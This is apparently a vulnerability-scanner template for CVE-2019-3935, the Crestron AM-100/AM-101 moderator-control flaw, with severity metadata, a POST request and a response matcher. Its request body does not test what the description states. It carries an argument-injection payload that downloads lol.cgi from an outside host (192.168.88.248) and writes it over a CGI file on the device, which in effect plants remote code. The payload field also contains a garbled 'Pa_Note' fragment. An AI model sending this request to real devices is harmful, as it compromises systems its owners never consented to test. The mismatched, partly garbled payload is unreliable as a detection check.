id: CVE-2019-3935

info:
  name: Crestron AM-100/AM-101 Moderator Control Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Crestron AM-100 with firmware 1.6.0.2 and AM-101 with firmware 2.7.0.2 allows anyone to act as a moderator to a slide show via crafted HTTP POST requests to conference.cgi.
  impact: |
    High - Allows unauthorized control of the device.
  remediation: |
    Apply the necessary patches or updates provided by Crestron to mitigate CVE-2019-3935.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2019-3935
    epss-score: 0.00857
    epss-percentile: 0.82919
    cpe: cpe:2.3:o:crestron:am-100_firmware:1.6.0.2:*:*:*:*:*:*:*
  metadata:
    vendor: crestron
    product: am-100_firmware

http:
  - method: POST
    path:
      - "{{BaseURL}}/cgi-bin/conference.cgi"

    headers:
      Content-Type: "application/x-www-form-urlencoded"

    body: "command=<Send><seid>fAEI0CHTDTHKcDVD</seid><upload><protocol>ftp</protocol><address>http://192.168.88.248:1270Pa_Note http://192.168.88.248:1270/lol.cgi -o /home/boa/cgi-bin/file_transfer.cgi</address><port>1270</port><account>lol</account><password>lol</password><logo>/tmp/wat</logo></upload></Send>"
    matchers:
      - type: word
        words:
          - "Moderator Control Enabled"
        part: body
